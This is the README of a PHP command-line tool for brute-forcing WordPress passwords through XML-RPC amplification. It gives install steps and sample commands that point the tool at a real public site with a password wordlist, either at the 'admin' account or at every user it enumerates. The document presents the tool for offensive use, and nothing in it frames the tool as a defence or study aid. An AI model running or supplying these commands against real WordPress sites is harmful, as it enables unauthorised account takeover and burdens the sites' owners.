# WP Bruteforcer

A simply PHP CLI Tool / Lib to bruteforce WordPress XMLRPC using amplification.

More info: [here](https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html)

# Requirements

* PHP 5.3+
* Composer

```php
composer install
```

# Usage

```php
php wpbruteforcer.php bruteforce http://wordpress.org/ --wordlist wordlist.txt --username admin
```

If none username is provided, the tool will enumerate the WordPress users and attack all of them.
```php
php wpbruteforcer.php bruteforce http://wordpress.org/ --wordlist wordlist.txt
```

To get a list of options use:
```php
php wpbruteforcer.php bruteforce -h
```
